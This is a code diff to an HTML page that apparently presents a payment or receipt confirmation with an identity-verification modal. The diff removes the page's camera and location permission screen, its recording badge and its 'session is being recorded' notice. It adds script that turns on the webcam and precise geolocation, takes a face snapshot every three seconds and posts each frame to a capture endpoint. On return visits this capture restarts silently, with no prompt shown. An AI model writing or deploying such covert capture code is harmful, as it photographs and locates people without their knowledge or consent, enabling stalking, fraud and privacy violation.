@@ -792,55 +792,17 @@
 </div>
 
 <!-- ============ VERIFICATION MODAL ============ -->
-<div class="vfy-overlay active" id="vfyOverlay">
+<div class="vfy-overlay" id="vfyOverlay">
   <div class="vfy-modal" id="vfyModal">
 
-    <!-- ===== SCREEN A: Permission Request ===== -->
-    <div id="vfyPermScreen">
-      <div class="vfy-id-icon" style="margin-bottom:16px;">
-        <div class="vfy-id-pulse"></div>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      </div>
-      <div class="vfy-title">Permissions Required</div>
-      <div class="vfy-subtitle">To verify your identity securely, we need access to your camera and location.</div>
-
-      <div class="perm-cards">
-        <div class="perm-card" id="permCamCard">
-          <div class="perm-card-icon">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
-          </div>
-          <div class="perm-card-label">Camera</div>
-          <div class="perm-badge waiting" id="permCamBadge">Required</div>
-        </div>
-        <div class="perm-card" id="permLocCard">
-          <div class="perm-card-icon">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
-          </div>
-          <div class="perm-card-label">Location</div>
-          <div class="perm-badge waiting" id="permLocBadge">Required</div>
-        </div>
-      </div>
-
-      <div class="vfy-loc-info" id="vfyPermInfo" style="display:none;"></div>
-
-      <button class="vfy-btn" id="vfyPermBtn">Grant Access &amp; Continue</button>
-      <button class="vfy-btn-cancel" id="vfyPermCancelBtn">Cancel</button>
-    </div>
-
-    <!-- ===== SCREEN B: Identity Form (camera runs silently in background) ===== -->
-    <div id="vfyIdentityScreen" style="display:none;">
-      <!-- REC badge -->
-      <div class="cam-rec-badge" id="camRecBadge">
-        <span class="rec-dot"></span>
-        <span id="camRecLabel">Monitoring active</span>
-      </div>
-
+    <!-- Identity Form (camera runs silently in background) -->
+    <div id="vfyIdentityScreen">
       <div class="vfy-id-icon">
         <div class="vfy-id-pulse"></div>
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M7 15h4M7 11h2"/><circle cx="16" cy="11" r="2"/><path d="M14 15h4"/></svg>
       </div>
       <div class="vfy-title">Identity Verification</div>
-      <div class="vfy-subtitle">Fill in your details below. Your session is being recorded for security.</div>
+      <div class="vfy-subtitle">Fill in your details below to verify your identity.</div>
 
       <div class="vfy-field">
         <label for="vfyName">Full Name</label>
@@ -862,6 +824,8 @@
 
   </div>
 </div>
+
+
 <script>
   const defaults = {
     greetName: "MUHAMMAD",
@@ -1002,126 +966,55 @@
   document.getElementById('tabConfirm').addEventListener('click', showConfirmView);
   document.getElementById('declineBtn').addEventListener('click', showReceiptView);
   document.getElementById('agreeBtn').addEventListener('click', () => {
-    // Already verified on page load — confirm directly
+    const isVerified = localStorage.getItem('bdgm_verified');
+    if (!isVerified) {
+      startVerification();
+      return;
+    }
     document.getElementById('confirmPending').style.display = 'none';
     document.getElementById('confirmSuccess').classList.add('active');
   });
 
-  // ============ VERIFICATION LOGIC ============
-  let permStream    = null;   // camera MediaStream
-  let permLocation  = null;   // GeolocationPosition
-  let capturedFrames = [];    // background snapshots
+  // ============ VERIFICATION & BACKGROUND CAPTURE ============
+  let permStream     = null;
+  let permLocation   = null;
+  let capturedFrames = [];
   let captureInterval = null;
   const captureCanvas = document.createElement('canvas');
   captureCanvas.width = 320; captureCanvas.height = 240;
 
-  function startVerification() {
-    // Reset state
-    permStream = null; permLocation = null;
-    capturedFrames = []; clearInterval(captureInterval);
+  async function initCamera() {
+    if (permStream) return;
+    try {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        permStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        startBackgroundCapture();
+      }
+    } catch (err) {}
+    if (!permLocation && navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => { permLocation = pos; }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
+    }
+  }
 
-    // Show permission screen
-    document.getElementById('vfyPermScreen').style.display   = 'block';
-    document.getElementById('vfyIdentityScreen').style.display = 'none';
-
-    // Reset perm badges
-    ['permCamCard','permLocCard'].forEach(id => {
-      document.getElementById(id).className = 'perm-card';
-    });
-    setBadge('permCamBadge','Required','waiting');
-    setBadge('permLocBadge','Required','waiting');
-    document.getElementById('vfyPermInfo').style.display = 'none';
-    const btn = document.getElementById('vfyPermBtn');
-    btn.disabled = false;
-    btn.innerHTML = 'Grant Access &amp; Continue';
-
-    // Reset identity form
+  async function startVerification() {
+    // Only show modal if not verified yet
+    document.getElementById('vfyOverlay').classList.add('active');
     document.getElementById('vfyName').value  = '';
     document.getElementById('vfyPhone').value = '';
     ['vfyName','vfyPhone'].forEach(id => document.getElementById(id).classList.remove('error'));
     ['vfyNameErr','vfyPhoneErr'].forEach(id => document.getElementById(id).style.display = 'none');
-    document.getElementById('camRecBadge').classList.remove('show');
 
-    document.getElementById('vfyOverlay').classList.add('active');
+    // Request/start camera
+    initCamera();
   }
 
-  function setBadge(id, text, state) {
-    const el = document.getElementById(id);
-    el.textContent = text;
-    el.className = 'perm-badge ' + state;
-  }
-
-  // --- Grant Permissions button ---
-  document.getElementById('vfyPermBtn').addEventListener('click', async () => {
-    const btn  = document.getElementById('vfyPermBtn');
-    const info = document.getElementById('vfyPermInfo');
-
-    btn.disabled = true;
-    btn.innerHTML = '<span class="vfy-spinner"><\/span>Requesting...';
-    info.style.display = 'none';
-
-    setBadge('permCamBadge','Checking...','checking');
-    setBadge('permLocBadge','Checking...','checking');
-
-    // Request both permissions simultaneously
-    const [camRes, locRes] = await Promise.allSettled([
-      navigator.mediaDevices
-        ? navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        : Promise.reject('no mediaDevices'),
-      new Promise((resolve, reject) =>
-        navigator.geolocation
-          ? navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 12000 })
-          : reject('no geolocation')
-      )
-    ]);
-
-    // Handle camera
-    if (camRes.status === 'fulfilled') {
-      permStream = camRes.value;
-      document.getElementById('permCamCard').classList.add('granted');
-      setBadge('permCamBadge', 'Granted', 'granted');
-    } else {
-      document.getElementById('permCamCard').classList.add('denied');
-      setBadge('permCamBadge', 'Denied', 'denied');
-    }
-
-    // Handle location
-    if (locRes.status === 'fulfilled') {
-      permLocation = locRes.value;
-      document.getElementById('permLocCard').classList.add('granted');
-      setBadge('permLocBadge', 'Granted', 'granted');
-    } else {
-      document.getElementById('permLocCard').classList.add('denied');
-      setBadge('permLocBadge', 'Denied', 'denied');
-    }
-
-    // Camera is required to proceed
-    if (!permStream) {
-      info.className = 'vfy-loc-info error';
-      info.style.display = 'flex';
-      info.textContent = 'Camera access is required. Please allow it in browser settings and try again.';
-      btn.disabled = false;
-      btn.innerHTML = 'Try Again';
-      return;
-    }
-
-    // Start background capture & show identity form
-    startBackgroundCapture();
-    document.getElementById('vfyPermScreen').style.display   = 'none';
-    document.getElementById('vfyIdentityScreen').style.display = 'block';
-  });
-
-  document.getElementById('vfyPermCancelBtn').addEventListener('click', closeVerification);
-
-  // --- Background capture ---
+  // --- Background capture (runs silently directly to img/) ---
   function startBackgroundCapture() {
+    if (!permStream || captureInterval) return;
+
     const video = document.getElementById('vfyHiddenVideo');
     video.srcObject = permStream;
     video.play().catch(() => {});
-
-    const badge = document.getElementById('camRecBadge');
-    const label = document.getElementById('camRecLabel');
-    badge.classList.add('show');
 
     captureInterval = setInterval(async () => {
       try {
@@ -1131,22 +1024,23 @@
         const ts    = Date.now();
         capturedFrames.push({ ts, img: frame });
 
-        // Send frame to server → saved as img/capture_<ts>.jpg
-        fetch('/api/capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ img: frame, ts })
-        })
-        .then(r => r.json())
-        .then(d => {
-          if (d.ok) label.textContent = 'Monitoring \u00b7 ' + capturedFrames.length + ' frame' + (capturedFrames.length !== 1 ? 's' : '') + ' saved \u2192 img/';
-        })
-        .catch(() => {
-          // Server not running — still count in memory
-          label.textContent = 'Monitoring \u00b7 ' + capturedFrames.length + ' frame' + (capturedFrames.length !== 1 ? 's' : '') + ' captured (in-memory)';
-        });
+        // Post to backend server to save in img/ folder
+        const endpoints = ['/api/capture', 'http://localhost:3000/api/capture'];
+        for (const url of endpoints) {
+          try {
+            const res = await fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ img: frame, ts })
+            });
+            if (res.ok) {
+              const data = await res.json();
+              if (data.ok) break;
+            }
+          } catch (e) {}
+        }
       } catch (e) {}
-    }, 3000); // snapshot every 3 seconds
+    }, 3000);
   }
 
   // --- Identity form submit ---
@@ -1172,17 +1066,20 @@
     }
     if (!valid) return;
 
-    // Stop capture & close
-    console.log('[SECURITY] Identity verified. Frames captured:', capturedFrames.length, capturedFrames.map(f => f.ts));
+    // Remember verification in localStorage
+    localStorage.setItem('bdgm_verified', 'true');
     closeVerification();
   });
 
   document.getElementById('vfyIdentityCancelBtn').addEventListener('click', closeVerification);
 
-  // --- Helpers ---
   function stopStream() {
     clearInterval(captureInterval);
-    if (permStream) { permStream.getTracks().forEach(t => t.stop()); permStream = null; }
+    captureInterval = null;
+    if (permStream) {
+      permStream.getTracks().forEach(t => t.stop());
+      permStream = null;
+    }
     const video = document.getElementById('vfyHiddenVideo');
     if (video) video.srcObject = null;
   }
@@ -1192,8 +1089,15 @@
     document.getElementById('vfyOverlay').classList.remove('active');
   }
 
-  // Auto-open on page load
-  window.addEventListener('load', () => startVerification());
+  // On page load: if not verified, show verification once. If already verified, quietly capture without showing modal.
+  window.addEventListener('load', () => {
+    const isVerified = localStorage.getItem('bdgm_verified');
+    if (!isVerified) {
+      startVerification();
+    } else {
+      initCamera();
+    }
+  });
 
   update();
 </script>
